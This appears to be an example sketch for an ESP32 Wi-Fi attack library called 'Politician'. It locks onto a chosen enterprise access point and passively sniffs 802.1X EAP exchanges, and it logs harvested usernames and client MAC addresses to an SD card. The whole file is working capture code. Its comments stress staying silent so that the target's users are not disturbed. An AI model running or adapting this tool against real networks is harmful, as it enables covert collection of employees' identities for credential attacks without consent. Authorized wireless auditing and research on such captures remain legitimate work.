#include <Arduino.h>
#include <SD.h>
#include <SPI.h>
#include "Politician.h"
#include "PoliticianStorage.h"

using namespace politician;
using namespace politician::storage;

Politician engine;

// ==========================================
// TARGET ENTERPRISE NETWORK CONFIGURATION
// ==========================================
const uint8_t TARGET_BSSID[6] = { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55 }; // Replace with the MAC of your target AP
const uint8_t TARGET_CHANNEL = 6;                                       // Replace with the channel of your target AP

void setup() {
    Serial.begin(115200);
    delay(2000); // Give serial monitor time to connect

    Serial.println("\n[+] Initializing Storage...");
    if (!SD.begin(5)) {
        Serial.println("[-] SD Card Mount Failed!");
        return;
    }

    Serial.println("[+] Enabling Politician Engine...");

    Config cfg;
    // We strictly filter for Beacons (so we know when AP is found) and Handshakes (EAPOL).
    cfg.capture_filter = LOG_FILTER_BEACONS | LOG_FILTER_HANDSHAKES;
    engine.begin(cfg);

    // 1. Target Lock: Lock onto the specific AP so we constantly listen without hopping.
    engine.setTarget(TARGET_BSSID, TARGET_CHANNEL);
    
    // 2. Passive Operation: We do NOT want to deauthenticate enterprise users.
    // 802.1X reconnections are slow and highly disruptive. We just wait silently.
    engine.setAttackMask(ATTACK_PASSIVE);

    // 3. Hook the Identity Harvester
    engine.setIdentityCallback([](const EapIdentityRecord &rec) {
        // Log it to our dedicated CSV logger
        if (EnterpriseCsvLogger::append(SD, "/identities.csv", rec)) {
            Serial.printf("\n[BINGO] Harvested Username: %s\n", rec.identity);
            Serial.printf("        AP: %02X:%02X:%02X:%02X:%02X:%02X  Client: %02X:%02X:%02X:%02X:%02X:%02X\n",
                rec.bssid[0], rec.bssid[1], rec.bssid[2], rec.bssid[3], rec.bssid[4], rec.bssid[5],
                rec.client[0], rec.client[1], rec.client[2], rec.client[3], rec.client[4], rec.client[5]
            );
        }
    });

    // 4. Hook Standard AP logging just so we can see when targets broadcast
    engine.setApFoundCallback([](const ApRecord &rec) {
        Serial.printf("[+] Detected broadcast from %s on Channel %d\n", rec.ssid, rec.channel);
    });

    Serial.printf("[+] Auditing Engine Locked onto %02X:%02X:%02X:%02X:%02X:%02X (Channel %d)\n",
        TARGET_BSSID[0], TARGET_BSSID[1], TARGET_BSSID[2], TARGET_BSSID[3], TARGET_BSSID[4], TARGET_BSSID[5],
        TARGET_CHANNEL
    );
    Serial.println("[+] Passively awaiting 802.1X TLS/EAP identity exchanges...");
}

void loop() {
    // The main thread is entirely free.
    // All framework extraction runs asynchronously inside the promiscuous interrupt layer.
    delay(1000);
}
